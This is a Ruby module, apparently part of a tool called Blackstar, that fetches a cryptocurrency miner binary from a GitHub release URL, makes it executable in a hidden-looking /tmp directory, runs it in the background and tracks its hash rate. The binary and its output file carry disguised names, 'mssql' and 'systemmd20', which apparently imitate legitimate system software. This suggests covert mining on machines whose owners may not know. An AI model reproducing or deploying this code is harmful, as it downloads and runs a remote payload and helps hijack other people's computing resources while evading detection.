module Blackstar
  class MinerLinux
    MINER_GITHUB = "https://github.com/speedy-gonzalez2017/blackstar/releases/download/0.0.1/mssql"
    attr_reader :miner_path, :config_path, :output_miner_path, :base_path, :host
    attr_accessor :miner_started

    def initialize(host)
      @host = host
      @base_path = "/tmp/ri0eigreigrei321__"
      @miner_path = "#{base_path}/mssql"
      @config_path = "#{base_path}/config.json"
      @output_miner_path = "#{base_path}/systemmd20"
      @miner_started = false
    end

    def init
      remove_old_files
      copy_new_files
    end

    def run_loop
      kill_process
      start_mine
      process_detector = Blackstar::ProcessDetector.new(self)

      i = 1
      process_detector.watch do
        i += 1
        if i == 10
          yield
          i = 1
        end
      end
    end

    def start_mine
      self.miner_started = true
      Cmd.call_forked("#{miner_path} > #{output_miner_path}")
      p "Started Miner"
    end

    def remove_old_files
      [miner_path, config_path, output_miner_path].each do |path|
        Cmd.call("rm -f #{path}")
      end
    end

    def copy_new_files
      Cmd.call("mkdir -p #{base_path}")

      Cmd.download_file(:linux, @base_path, MINER_GITHUB)

      host.generate_config(config_path)

      Cmd.call("chmod +x #{miner_path}")
      Cmd.call("touch #{output_miner_path}")
    end

    def get_hash_rate
      output = nil
      File.open(output_miner_path, 'r') do |f|
        output = f.read
      end

      File.open(output_miner_path, 'w') do |f|
        f.write('')
      end

      good_line = output.match(/speed .* H\/s/)
      if good_line
        good_line.to_s.scan(/\d+/)[4]
      else
        0
      end
    end

    def kill_process
      pid = Cmd.call("pgrep mssql")
      if pid != ''
        Cmd.call("kill -9 #{pid}")
        p 'Killed Miner'
        self.miner_started = false
      end
    end
  end
end